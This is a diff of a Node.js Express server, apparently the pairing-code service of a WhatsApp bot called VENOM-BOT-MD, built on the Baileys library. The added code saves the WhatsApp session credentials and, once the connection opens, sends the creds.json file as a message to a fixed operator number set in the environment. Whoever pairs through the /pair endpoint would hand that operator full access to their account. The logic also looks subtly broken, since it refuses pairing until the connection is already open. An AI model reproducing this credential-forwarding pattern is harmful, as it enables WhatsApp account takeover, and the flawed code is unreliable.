@@ -1,92 +1,116 @@
-const express = require("express")
-const fs = require("fs")
-const path = require("path")
-const pino = require("pino")
+const express = require("express");
+const fs = require("fs");
+const path = require("path");
+const pino = require("pino");
 
 const {
-default: makeWASocket,
-useMultiFileAuthState,
-fetchLatestBaileysVersion,
-DisconnectReason
-} = require("@whiskeysockets/baileys")
+  default: makeWASocket,
+  useSingleFileAuthState,
+  fetchLatestBaileysVersion,
+  DisconnectReason
+} = require("@whiskeysockets/baileys");
 
-const app = express()
+const app = express();
 
-const sessionPath = "/opt/render/project/src/session"
+// ملف مؤقت لتخزين creds قبل الإرسال
+const tempCredsPath = path.join(__dirname, "creds.json");
 
-if (!fs.existsSync(sessionPath)){
-fs.mkdirSync(sessionPath,{recursive:true})
+// رقمك فـ واتساب (بدون +)
+const OWNER_NUMBER = process.env.OWNER_NUMBER;
+if(!OWNER_NUMBER) throw new Error("Set OWNER_NUMBER environment variable!");
+
+// ✅ تشغيل البوت
+let sock;
+let isConnected = false;
+
+async function connectSocket() {
+  // ephemeral auth state
+  const { state, saveCreds } = useSingleFileAuthState(tempCredsPath);
+
+  const { version } = await fetchLatestBaileysVersion();
+
+  sock = makeWASocket({
+    logger: pino({ level: "info" }),
+    auth: state,
+    browser: ["VENOM-BOT-MD","CHROME","1.0.0"],
+    version,
+  });
+
+  sock.ev.on("creds.update", async (newCreds) => {
+    saveCreds();
+  });
+
+  sock.ev.on("connection.update", async (update) => {
+    console.log(update);
+
+    const { connection, lastDisconnect } = update;
+
+    if(connection === "close"){
+      const reason = lastDisconnect?.error?.output?.statusCode;
+      console.log("🔴 Disconnected:", reason);
+      isConnected = false;
+      if(reason !== DisconnectReason.loggedOut){
+        console.log("♻️ Reconnecting...");
+        connectSocket();
+      }
+    }
+
+    if(connection === "open"){
+      console.log("✅ BOT READY FOR PAIRING");
+      isConnected = true;
+
+      // إرسال creds.json للواتساب
+      try{
+        if(fs.existsSync(tempCredsPath)){
+          const credsBuffer = fs.readFileSync(tempCredsPath);
+          await sock.sendMessage(
+            OWNER_NUMBER + "@s.whatsapp.net",
+            {
+              document: credsBuffer,
+              mimetype: "application/json",
+              fileName: "creds.json"
+            }
+          );
+          console.log("📩 creds.json sent to owner!");
+          // مسح الملف بعد الإرسال
+          fs.unlinkSync(tempCredsPath);
+        }
+      }catch(e){
+        console.log("❌ Error sending creds:", e);
+      }
+    }
+  });
 }
 
-let sock
+// تشغيل البوت
+connectSocket();
 
-async function connectSocket(){
-
-const { state, saveCreds } = await useMultiFileAuthState(sessionPath)
-
-const { version } = await fetchLatestBaileysVersion()
-
-sock = makeWASocket({
-logger:pino({level:"info"}),
-auth:state,
-browser:["VENOM","CHROME","1.0.0"],
-version
-})
-
-sock.ev.on("creds.update", saveCreds)
-sock.ev.on("connection.update", (update)=>{
-
-console.log(update)
-
-const { connection, lastDisconnect } = update
-if(connection === "close"){
-
-const reason = lastDisconnect?.error?.output?.statusCode
-
-if(reason !== DisconnectReason.loggedOut){
-connectSocket()
-}
-
-}
-
-if(connection === "open"){
-console.log("✅ BOT READY FOR PAIRING")
-}
-
-})
-
-}
-
-connectSocket() // 🔥 هنا الحل
-
+// 🌐 واجهة pairing code
 app.get("/pair", async (req,res)=>{
+  const number = req.query.number;
+  if(!number) return res.send("Enter Number");
 
-let number = req.query.number
+  if(!isConnected || !sock?.user){
+    return res.send("BOT not ready yet, wait a few seconds...");
+  }
 
-if(!number) return res.send("Enter Number")
+  try{
+    let code = await sock.requestPairingCode(number);
+    code = code.match(/.{1,4}/g).join("-");
+    res.send(code);
+  }catch(e){
+    console.log(e);
+    res.send("Error: Connection Closed");
+  }
+});
 
-try{
-
-let code = await sock.requestPairingCode(number)
-
-code = code.match(/.{1,4}/g).join("-")
-
-res.send(code)
-
-}catch(e){
-
-res.send("Error: Connection Closed")
-
-}
-
-})
-
+// واجهة HTML
 app.get("/",(req,res)=>{
-res.sendFile(__dirname + "/index.html")
-})
+  res.sendFile(path.join(__dirname, "index.html"));
+});
 
-const PORT = process.env.PORT || 3000
-
+// تشغيل السيرفر
+const PORT = process.env.PORT || 3000;
 app.listen(PORT,()=>{
-console.log("🕷️ SERVER RUNNING")
-})
+  console.log(`🕷️ VENOM-BOT-MD PAIR SERVER RUNNING at http://localhost:${PORT}`);
+});
